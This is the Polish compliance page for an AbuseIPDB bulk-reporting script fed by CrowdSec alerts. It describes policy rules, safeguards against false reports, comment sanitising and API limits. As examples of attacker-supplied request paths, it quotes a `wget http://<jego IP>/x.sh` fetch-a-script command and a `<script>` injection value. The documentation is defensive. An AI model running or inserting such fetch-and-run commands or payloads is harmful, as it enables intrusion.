[English](../COMPLIANCE.md) | **Polski**

Wersja: 3.6.20 (`abuseipdb_report.py`)

# Zgodność z AbuseIPDB

Zweryfikowane 2026-09-29 na surowej dokumentacji AbuseIPDB (API v2, formularz `bulk-report`, polityka zgłaszania,
FAQ i lista kategorii). Treść polityki może się zmienić; przed poleganiem na tej stronie sprawdź ją ponownie.

## Reguły polityki i sposób ich spełnienia

| Reguła (źródło) | Realizacja |
|---|---|
| Zgłoszenia starsze niż 60 dni są zabronione (polityka) | Twardy filtr `MAX_AGE_DAYS = 60` na każdym wierszu; walidator też odrzuca starsze daty. |
| Zgłoszenie wymaga szczegółowego opisu: port, payload, czas (polityka) | Komentarz zawiera protokół i porty, nazwy scenariuszy, liczbę zdarzeń, zakres czasu i prawdziwe ścieżki HTTP. |
| Krótki komentarz; bez e-maila i adresu IP w komentarzu (FAQ) | Komentarz nigdy nie zawiera zgłaszanego IP, nazwy hosta ani naszych domen; wymusza to walidator (nasze nazwy pochodzą z `OWN_NAME_MARKERS` w configu; przy pustej liście lub przy wartościach przykładowych wysyłka na żywo jest odmawiana). Wroga próbka żądania zawierająca taką nazwę jest pomijana w komentarzu, zamiast psuć plik. |
| Przy ciągłym nadużyciu zgłaszać IP mniej więcej raz na dobę (FAQ) | Jeden przebieg na dobę, jeden wiersz na IP, blokada 20 h we wrapperze. |
| Bez źródeł, które łatwo sfałszować, jak floody SYN/UDP; TCP tylko po pełnym three-way handshake, UDP nigdy (polityka) | Tylko scenariusze z logów aplikacyjnych (HTTP, SSH): żądanie lub próba logowania dotarły do aplikacji, więc handshake TCP był pełny. |
| Bez zgłaszania na podstawie cudzego wskaźnika pewności (polityka) | Źródłem są tylko lokalne alerty (`kind == "crowdsec"`); bany z listy społeczności są ignorowane. |
| Fałszywe zgłoszenia grożą zawieszeniem konta | Siedem niezależnych bezpieczników, patrz niżej. |

## Bezpieczniki przed zgłoszeniem własnego lub niewinnego adresu

1. Adresy nieglobalne (prywatne, loopback, link-local, zarezerwowane, multicast, CGNAT 100.64.0.0/10, zakresy
   dokumentacyjne) nigdy nie są zgłaszane. Samo `is_private` nie łapie CGNAT, dlatego używane jest `is_global`.
2. `EXCLUDE_SCENARIOS`: scenariusze o udokumentowanej historii fałszywych alarmów na legalnym ruchu
   (`http-crawl-non_statics` odpalał na masowych uploadach WebDAV). Zostają w CrowdSecu do banowania, ale nie są
   zgłaszane.
3. `WEAK_ONLY_SCENARIOS`: adres, którego jedynym scenariuszem jest słaby sygnał (`http-bad-user-agent`, typowy dla
   pasywnych skanerów badawczych), nie jest zgłaszany; jeden bardziej konkretny scenariusz obok kwalifikuje go.
4. Lista wykluczeń (wpisy `EXCLUDE` z `~/.secrets/abuseipdb.conf` plus przestarzały `~/.secrets/abuseipdb_exclude.txt`),
   domyślnie włączona. Nieprawidłowy wpis zatrzymuje przebieg (kod wyjścia 2) zamiast zostać pominięty, bo pominięty
   wpis sprawiłby, że adres, który operator chciał chronić, stałby się zgłaszalny.
5. Auto-zaufanie SSH: każdy adres z udanym logowaniem SSH w ciągu ostatnich 60 dni jest wykluczony. Linia logowania
   musi zaczynać się od `Accepted <metoda> for`, więc atakujący z loginem "Accepted" nie może sam siebie wykluczyć.
   Liczy się tylko PEŁNE logowanie (przy drugim składniku pierwszy krok jest logowany jako `Partial ...` i ignorowany).
   Czytane są obie nazwy jednostki (`ssh` na Debianie/Ubuntu, `sshd` na RHEL/Fedorze/Archu). Zaufane metody:
   `publickey`, `password`, `keyboard-interactive/<urządzenie>`, `hostbased`, `gssapi-*`; `Accepted none` (bez żadnego
   uwierzytelnienia) nie jest zaufane. Journal, którego użytkownik nie może w całości czytać, jest zgłaszany głośno,
   zamiast po cichu zawężać zaufanie.
   Adresy są też trzymane w `~/.secrets/ssh_trusted_seen.txt`, bo journal jest przycinany.
6. Własne publiczne adresy serwera (z `ip addr`) są zawsze wykluczone.
7. Nieznane scenariusze nigdy nie są zgłaszane: kwalifikują się tylko scenariusze autora `crowdsecurity`, które są w
   `CATEGORY_MAP` albo nazwane od prawdziwego identyfikatora CVE (`cve-RRRR-NNNN...`). Identyfikator CVE w nazwie
   scenariusza innego autora nie wystarcza (`ktos/postfix-cve-...` to nie atak na aplikację webową). Scenariusz dla innej
   usługi (postfix, MySQL) albo własnej aplikacji operatora poszedłby inaczej do bazy jako "hacking", czyli fałszywe
   zgłoszenie. Scenariusz innego autora jest zgłaszany dopiero po dopisaniu go przez operatora do `CATEGORY_MAP` pod
   pełną nazwą (`autor/nazwa`); ta sama krótka nazwa od innego autora (`ktos/ssh-bf`) nie jest zaufana.

Świadomie nie robimy: białej listy ASN (ASN mówi, gdzie wynajęto maszynę, a nie o intencji) ani zgłaszania zakresów
CIDR (CSV przyjmuje pojedyncze adresy).

## Poprawność danych w zgłoszeniu

- **Liczba zdarzeń.** To samo żądanie HTTP często zasila kilka scenariuszy CrowdSeca naraz. Sumowanie `events_count`
  po wszystkich alertach zawyżało licznik o około 20 % na prawdziwych danych. Teraz liczba to większa z: liczby
  unikalnych żądań i największej sumy dla pojedynczego scenariusza. To dolna granica, nigdy przesada.
- **Czas.** Zdarzenia SSH czytane z journald mają czas lokalny oznaczony jako UTC (przesunięcie +2 h w CEST). Czasy
  pochodzą więc z `start_at` / `stop_at` / `created_at` alertu, nigdy z `events[].timestamp`. Zdarzeń HTTP to nie
  dotyczy.
- **Protokół.** Z pola `service` zdarzeń (http lub ssh). Gdy go brak, używany jest prefiks scenariusza; nieznany
  protokół daje brak zdania "Target" zamiast zgadywania.
- **Porty.** Zdarzenia CrowdSeca nie niosą portu, więc porty HTTP w zgłoszeniu to te, które operator deklaruje kluczem
  `HTTP_PORTS` w configu (domyślnie `80/443`: typowe reverse proxy przyjmuje 80 i 443; na serwerze autora około 4 % HTTP
  i 96 % HTTPS). Zgłoszenia HTTP mówią "HTTP/HTTPS (ports 80/443)" albo "HTTP/HTTPS (port 8443)" dla jednego portu.
  Ustaw go, jeśli serwer WWW słucha gdzie indziej, inaczej publiczne zgłoszenie poda zły port. Przyjmowane są tylko
  cyfry i `/`, więc tym kluczem nic innego nie trafi do komentarza.
- **HTTP 200 w zgłoszeniu.** "200" na ścieżkach typu `/.env` to zwykle fallback aplikacji jednostronicowej
  zwracający HTML, a nie wyciek. Zgłoszenie podaje status zgodnie z prawdą.
- **Próbki żądań pochodzą od atakującego.** Ścieżki HTTP w komentarzu wpisuje atakujący, który może w nich umieścić
  naszą nazwę domeny (skanery wklejają nazwę hosta celu w ścieżkę) albo własny adres (`wget http://<jego IP>/x.sh`).
  Próbka zawierająca znacznik własnej nazwy, zgłaszany IP albo jeden z własnych adresów publicznych serwera jest
  pomijana w komentarzu; zgłoszenie i jego pozostałe próbki zostają. Przed 3.6.4 jedna taka ścieżka powodowała
  odrzucenie całego pliku przez walidator (brak zgłoszeń tego dnia, alert, nadrobienie w następnym przebiegu).
  Sam walidator się nie zmienił i nadal odrzuca taki komentarz jako ostatnia linia obrony.
- **Poświadczenia w próbkach żądań.** Komentarz trafia do publicznej bazy, więc WARTOŚCI parametrów zapytania, których
  nazwa wygląda na poświadczenie (`token`, `key`, `api_key`, `secret`, `password`, `session`, `PHPSESSID`, `auth`, `sig`,
  `jwt`, `code`, `csrf` i podobne), są zastępowane przez `***` (`?token=***&x=1`). Reszta żądania zostaje, więc ładunek
  ataku w zwykłym parametrze nadal jest widoczny jako dowód (`keyword=<script>` nie jest maskowane, bo nazwa jest
  dopasowywana jako całe słowo, nie jako podciąg). To działanie w miarę możliwości, nie gwarancja: sekret w samej
  ścieżce (`/share/<token>`), pod nietypową nazwą parametru albo w nazwie zakodowanej procentowo nie zostanie rozpoznany.
- **Adresy e-mail w próbkach żądań.** FAQ AbuseIPDB prosi, by nie umieszczać danych osobowych w komentarzach, więc
  próbka wyglądająca na zawierającą adres e-mail jest pomijana, tak jak próbka z własną nazwą.
- **Cudzysłowy i backslashe.** Strona bulk-report mówi, że backslashe i cudzysłowy wymagają eskejpowania: parser CSV
  AbuseIPDB traktuje backslash jako znak ucieczki. Cudzysłów jest zapisywany jako `%22`, a komentarz nigdy nie kończy
  się backslashem; walidator odrzuca backslash przed cudzysłowem lub na końcu. Pozostałe backslashe zostają jako dowód.

## Kategorie

- Kategorie są przypisane per scenariusz w `CATEGORY_MAP`; nigdy nie nadawać kategorii mocniejszej, niż widać w logu.
- Scenariusz spoza mapy jest pomijany i wypisywany na stderr (`unknown scenario ... - not reported`); nie ma kategorii
  domyślnej. Jedyny wyjątek to scenariusz `crowdsecurity` nazwany od identyfikatora CVE, który dostaje 15,21 (hacking +
  atak na aplikację webową), bo próba exploita jest tym, co taki scenariusz wykrywa.
- `http-open-proxy` używa 14 (skanowanie portów / podatne usługi). Kategoria 9 twierdziłaby, że zgłaszany host sam
  jest otwartym proxy, a atakujący tylko próbował użyć naszego.
- Kategoria 4 (DDoS) nie jest używana: przekroczenie limitu żądań to nie atak wolumetryczny.
- Kategoria 22 (SSH) jest zawsze łączona z bardziej szczegółową (brute force, skanowanie portów albo hacking).

## Limity API i pliku

| Pozycja | Limit |
|---|---|
| Rozmiar CSV | poniżej 8 MB i najwyżej 10 000 linii razem z nagłówkiem |
| Komentarz | obcinany po 1024 bajtach |
| Kolumny | `IP`, `Categories`, `ReportDate`, `Comment` (dowolna kolejność) |
| `ReportDate` | ISO 8601 ze strefą, czas ostatniej obserwacji, nie starszy niż dwa miesiące |
| Kategorie | liczby całkowite 1 do 23; wiele kategorii jest w CSV w cudzysłowie |
| Duplikaty | ten sam IP najwyżej raz na 15 minut; ten sam komentarz i kategorie w 24 h są scalane |
| Dzienne zapytania `bulk-report` | Standard 5, Basic 100, Premium 500 (dokumentacja API); darmowe odznaki Webmaster i Supporter podnoszą limit Standard (20 widziane na koncie z obiema). Projekt używa jednego na dobę |
| Błędy bez `Accept: application/json` | zwracane jako strona HTML, więc wrapper zawsze wysyła ten nagłówek |
| Odrzucone wiersze | wymienione w `invalidReports` (np. "Invalid IP", "Duplicate IP", "Invalid Category") |
